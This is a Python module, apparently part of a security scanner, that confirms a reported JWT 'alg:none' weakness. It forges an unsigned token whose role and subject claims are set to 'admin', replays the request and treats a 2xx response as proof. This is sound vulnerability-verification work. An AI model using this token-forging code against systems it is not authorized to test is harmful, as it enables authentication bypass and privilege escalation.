from backend.services.verification_engine import (
    VerificationStatus,
    VerificationReasonCode,
    VerificationConclusion,
    BaseVerificationStrategy,
    VerificationContext,
    VerificationContract,
)
from backend.services.verification_strategies.request_builder import build_injected_request
import json
import base64

class JwtVerificationStrategy(BaseVerificationStrategy):
    """
    Verifies JWT Algorithm Weaknesses (e.g. alg:none) by forging a token.
    """
    
    contract = VerificationContract(
        check_id="C020_JWT_Algorithm_Weakness",
        name="JWT Algorithm Weakness Verification",
        security_property="Server must reject JWTs with alg:none or invalid signatures.",
        required_evidence_fields=["proof_request"],
        destructive=False,
    )

    async def verify(self, context: VerificationContext) -> VerificationConclusion:
        candidate = context.candidate_evidence
        if context.budget.max_requests <= 0:
            return VerificationConclusion(
                status=VerificationStatus.INCONCLUSIVE,
                reason_code=VerificationReasonCode.BUDGET_EXHAUSTED,
                reason_description="Verification budget exhausted.",
            )

        injected_req = build_injected_request(candidate, "")
        if not injected_req:
            return VerificationConclusion(
                status=VerificationStatus.INCONCLUSIVE,
                reason_code=VerificationReasonCode.MISSING_EVIDENCE,
                reason_description="Could not reconstruct proof request.",
            )

        auth_header = None
        for k, v in injected_req.headers.items():
            if k.lower() == "authorization" and "Bearer " in v:
                auth_header = v
                break

        if not auth_header:
            return VerificationConclusion(
                status=VerificationStatus.INCONCLUSIVE,
                reason_code=VerificationReasonCode.MISSING_EVIDENCE,
                reason_description="No Bearer token found in request headers.",
            )

        token = auth_header.split("Bearer ")[1]
        parts = token.split(".")
        if len(parts) != 3:
            return VerificationConclusion(
                status=VerificationStatus.INCONCLUSIVE,
                reason_code=VerificationReasonCode.MISSING_EVIDENCE,
                reason_description="Invalid JWT format.",
            )

        # Create alg:none token
        header = {"alg": "none", "typ": "JWT"}
        header_b64 = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip("=")
        
        # Modify payload to elevate privileges or just replay
        payload_b64 = parts[1]
        payload = json.loads(base64.urlsafe_b64decode(payload_b64 + "===").decode())
        if "role" in payload:
            payload["role"] = "admin"
        if "sub" in payload:
            payload["sub"] = "admin"
            
        new_payload_b64 = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip("=")
        
        forged_token = f"{header_b64}.{new_payload_b64}."
        injected_req.headers["Authorization"] = f"Bearer {forged_token}"

        context.budget.max_requests -= 1
        response = await context.request_engine.execute(injected_req)
        
        ev_id = context.record_evidence(
            evidence_type="jwt_alg_none_attempt",
            data={"status": response.status_code, "forged_token": forged_token},
            request_id=response.request_id,
        )

        if response.status_code in (200, 201, 204):
            return VerificationConclusion(
                status=VerificationStatus.VERIFIED,
                reason_code=VerificationReasonCode.REPRODUCED_SUCCESSFULLY,
                reason_description="Server accepted forged alg:none JWT.",
                evidence_ids=[ev_id],
                request_ids=[response.request_id],
                confidence=100,
            )

        return VerificationConclusion(
            status=VerificationStatus.FALSE_POSITIVE,
            reason_code=VerificationReasonCode.CONTRADICTORY_EVIDENCE,
            reason_description=f"Server rejected alg:none JWT (status {response.status_code}).",
            evidence_ids=[ev_id],
            request_ids=[response.request_id],
            confidence=100,
        )
